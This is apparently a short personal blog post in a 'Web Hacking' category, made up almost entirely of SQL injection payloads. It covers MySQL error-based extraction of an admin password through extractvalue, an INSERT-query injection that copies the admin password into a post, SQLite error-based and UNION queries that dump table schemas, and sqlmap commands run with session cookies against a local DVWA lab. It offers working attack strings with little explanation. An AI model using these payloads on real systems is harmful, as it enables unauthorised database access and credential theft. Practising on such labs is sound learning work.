---
title: SQL Injection
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---


## MySQL Error based sql injection

~~~ sql
admin' AND extractvalue(null, ( SELECT upw from user where uid='admin' ) );

# output : (1105, "XPATH syntax error: 'PasSwOrD123...'")


admin' AND extractvalue(null, concat(0x23, ( SELECT upw from user where uid='admin' ) ) );
admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 1, 20) from user where uid='admin' ) ) );
admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 21, 100) from user where uid='admin' ) ) );
~~~

<br>

## MySQL Insert query injection

~~~ sql
-- example
insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0);

-- payload
asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#

-- result
insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0); 
~~~

<br>

## SQLite Error based injection

~~~ sql
AND CASE WHEN (SELECT 1 FROM Users WHERE email='jim@juice-sh.op') THEN 1 ELSE load_extension(1) END;
~~~

<br>

## SQLite Extract table name, sql

~~~ sql
UNION SELECT name,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table';
~~~


<br>

## SQLMap

~~~ bash
sqlmap --cookie="PHPSESSID=4ppgmkccp0ie0d6b6432vp5boo; security=low" -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --current-db
sqlmap --cookie="PHPSESSID=4ppgmkccp0ie0d6b6432vp5boo; security=low" -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=a&Submit=Submit#" -p id --current-db
~~~





